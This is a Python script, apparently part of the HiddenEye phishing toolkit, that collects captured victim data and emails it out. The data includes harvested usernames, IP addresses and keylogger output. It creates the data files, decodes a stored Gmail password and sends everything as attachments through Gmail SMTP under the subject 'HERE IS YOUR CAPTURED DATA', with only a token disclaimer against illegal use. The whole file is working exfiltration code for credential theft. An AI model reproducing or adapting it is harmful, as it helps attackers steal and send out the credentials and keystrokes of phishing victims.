#!/usr/bin/env python
# encoding: utf-8

import os
import base64
import smtplib
import emailconfig
from os import system
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

COMMASPACE = ', '


def main():
    system('touch Defs/Send_Email/attachments/READ_IT.txt && touch Defs/Send_Email/attachments/usernames.txt && touch Defs/Send_Email/attachments/ip.txt && touch Defs/Send_Email/attachments/KeyloggerData.txt')

    # Decoding Password from (Defs/Send_Email/emailconfig.py) ..
    gmail_password = base64.b64decode(emailconfig.gmail_password)
    gmail_password = (gmail_password.decode('utf-8'))

    # Create the enclosing (outer) message

    outer = MIMEMultipart()
    outer['Subject'] = "[ HIDDENEYE ]:: HERE IS YOUR CAPTURED DATA. (We don't support Illegal Use of Tool)"
    outer['To'] = emailconfig.recipient_email
    outer['From'] = emailconfig.gmail_account
    outer.preamble = ''
    # List of attachments
    print('[.] Adding Attachments...')
    attachments = ['Defs/Send_Email/attachments/READ_IT.txt', 'Defs/Send_Email/attachments/ip.txt',
                   'Defs/Send_Email/attachments/usernames.txt', 'Defs/Send_Email/attachments/KeyloggerData.txt']
    print('[.] Attachments Added.')
    # Add the attachments to the message
    for file in attachments:
        try:
            with open(file, 'rb') as fp:
                msg = MIMEBase('application', "octet-stream")
                msg.set_payload(fp.read())
            encoders.encode_base64(msg)
            msg.add_header('Content-Disposition', 'attachment',
                           filename=os.path.basename(file))

            outer.attach(msg)
        except:
            print("[.] Unable to open one of the attachments. Error Occured ! ")
            raise

    composed = outer.as_string()

    # Send the email
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.ehlo()
            s.starttls()
            s.ehlo()
            print('[.] Trying To Login To Your Gmail Account...')
            s.login(emailconfig.gmail_account, gmail_password)
            print('[.] Login : SUCCESS')
            print('[.] Sending Captured Data to Recipient Email Address...')
            s.sendmail(emailconfig.gmail_account,
                       emailconfig.recipient_email, composed)
            print('[.] EMAIL SEND : SUCCESS')
            s.close()
        print('')
        print("[+] Check Your Inbox For Email.")
    except:
        print("[^] Unable To Send The Email. Error Occured ! ")


if __name__ == '__main__':
    main()
